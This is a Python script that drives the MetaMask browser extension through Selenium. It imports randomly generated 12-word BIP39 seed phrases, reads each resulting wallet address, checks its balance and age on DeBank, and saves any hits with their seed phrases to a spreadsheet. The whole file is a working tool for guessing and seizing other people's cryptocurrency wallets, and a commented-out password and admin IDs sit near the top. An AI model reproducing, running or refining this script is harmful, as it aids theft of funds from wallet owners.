import threading
from random import randint
from time import sleep

from openpyxl import Workbook, load_workbook
from selenium import webdriver
from selenium.common.exceptions import ElementClickInterceptedException, NoSuchElementException
from selenium.webdriver import Keys
from selenium.webdriver.common.by import By
import os
import sys

try:
	PASSWORD, *ADMINS = [x.strip() for x in open("data/config.txt").readlines()]
	WORDS = [x.strip() for x in open("data/bip39.txt").readlines()]
	METAMASK = "data/MetaMask-Chrome.crx"
except FileNotFoundError:
	bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
	PASSWORD, *ADMINS = [x.strip() for x in open(os.path.abspath(os.path.join(bundle_dir, "data/config.txt"))).readlines()]
	WORDS = [x.strip() for x in open(os.path.abspath(os.path.join(bundle_dir, "data/bip39.txt"))).readlines()]
	METAMASK = os.path.abspath(os.path.join(bundle_dir, "data/MetaMask-Chrome.crx"))
# PASSWORD = "1waqM*94I0XQ2S"
# ADMINS = [819456256, 370847367]
WALLETS = []

try:
	WB = load_workbook('found.xlsx')
except FileNotFoundError:
	WB = Workbook()
WS = WB.active


def sender(wallet):
	if wallet["age"] != "None" or wallet["bal"] != "$0":
		pprint(f"{wallet["addr"]}\n{wallet["age"]}\n{wallet["bal"]}\n{wallet["srp"]}\n", "GREEN")
	else:
		print(wallet["addr"])
	WS.append([wallet["addr"], wallet["age"], wallet["bal"], wallet["srp"]])
	WB.save("found.xlsx")


def gen_phrase(length: int = 12) -> list:
	return [WORDS[randint(0, 2047)] for _ in range(length)]


def pprint(text, color="WHITE"):
	if color == "GREEN":
		print("\033[92m", end="")
	elif color == "RED":
		print("\033[91m", end="")
	elif color == "YELLOW":
		print("\033[93m", end="")
	print(text, end="\033[0m\n")


def searcher():
	options = webdriver.ChromeOptions()
	# options.add_argument("--headless=new")
	options.add_extension(METAMASK)

	driver = webdriver.Chrome(options=options)
	driver.implicitly_wait(10)
	# driver.get("chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html")
	sleep(3)
	driver.close()
	driver.switch_to.window(window_name=driver.window_handles[0])
	# CHECKBOX: Terms of use
	driver.find_element(By.ID, "onboarding__terms-checkbox").click()
	# BUTTON: Import exists wallet
	driver.find_elements(By.CLASS_NAME, "button")[1].click()
	# BUTTON: Agreement
	driver.find_elements(By.CLASS_NAME, "button")[1].click()
	while True:
		srp = gen_phrase()
		# FIELD: Put seed phrase
		for i in range(12):
			driver.find_element(By.ID, f"import-srp__srp-word-{i}").send_keys(srp[i])
		try:
			# BUTTON: If active - recovery
			driver.find_element(By.CLASS_NAME, "button").click()
			# FILED: Put password
			driver.find_elements(By.CLASS_NAME, "form-field__input")[0].send_keys(PASSWORD)
			driver.find_elements(By.CLASS_NAME, "form-field__input")[1].send_keys(PASSWORD)
			# CHECKBOX: Metamask can't recovery this password
			driver.find_element(By.CLASS_NAME, "check-box").click()
			# BUTTON: Import wallet
			driver.find_element(By.CLASS_NAME, "button").click()
			# BUTTON: Success - Understand
			driver.find_element(By.XPATH, f"/html/body/{"div/" * 7}button").click()
			# BUTTON: Install is done - Next
			driver.find_element(By.XPATH, f"/html/body/{"div/" * 7}button").click()
			# BUTTON: Complete
			driver.find_element(By.XPATH, f"/html/body/{"div/" * 7}button").click()
			# WAIT: Waiting stats
			sleep(4)
			# BUTTON: Settings
			driver.find_elements(By.XPATH, f"/html/body/{"div/" * 7}button")[1].click()
			# BUTTON: Address
			driver.find_elements(By.XPATH, f"/html/body/{"div/" * 6}button")[1].click()
			# TEXT: Addr
			addr = driver.find_element(By.XPATH, f"/html/body/{"div/" * 3}/section/{"div/" * 6}button/span/div").text
			WALLETS.append({"srp": " ".join(srp), "addr": addr, "age": "None", "bal": "None"})
			return
		except ElementClickInterceptedException:
			for i in range(12):
				driver.find_element(By.ID, f"import-srp__srp-word-{i}").send_keys(Keys.CONTROL, "a")
				driver.find_element(By.ID, f"import-srp__srp-word-{i}").send_keys(Keys.DELETE)


def checker():
	options = webdriver.ChromeOptions()
	options.add_argument("--headless=new")
	while True:
		driver = webdriver.Chrome(options=options)
		driver.implicitly_wait(3)
		if WALLETS:
			wallet = WALLETS.pop(0)
			try:
				driver.get(f"https://debank.com/profile/{wallet["addr"]}")
			except Exception as e:
				pprint(f"DeBank: time out: {e}", "YELLOW")
				WALLETS.append(wallet)
				continue
			while True:
				try:
					wallet["bal"] = driver.find_element(By.CSS_SELECTOR, "div.HeaderInfo_totalAssetInner__HyrdC").text.split("\n")[0]
					break
				except NoSuchElementException:
					sleep(1)
			try:
				wallet["age"] = driver.find_element(By.CSS_SELECTOR, "div.is-age").text.split("\n")[0]
			except NoSuchElementException:
				pass
			sender(wallet)
		else:
			sleep(1)


check = threading.Thread(target=checker)
check.start()
while True:
	try:
		searcher()
	except Exception as err:
		pass
		# pprint(f"Restart ChromeDriver {err}", "YELLOW")
